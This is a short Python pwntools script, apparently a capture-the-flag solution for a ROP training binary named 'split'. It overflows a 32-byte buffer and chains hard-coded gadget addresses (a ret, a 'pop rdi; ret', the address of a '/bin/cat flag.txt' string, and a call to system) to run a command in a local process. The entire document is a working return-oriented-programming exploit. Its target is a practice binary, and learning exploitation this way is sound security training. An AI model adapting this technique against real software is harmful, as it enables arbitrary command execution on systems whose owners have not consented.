#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
 
payload = cyclic(40, n=8) # 32 bytes of the buffer and 8 bytes for rbp
payload += p64(0x000000000040053e) # the extra ret instructioni
payload += p64(0x00000000004007c3) # pop rdi; ret
payload += p64(0x0000000000601060) # /bin/cat flag.txt string
payload += p64(0x0000000000400560) # call to system

p = process("./split")
p.send(payload)
p.interactive()


















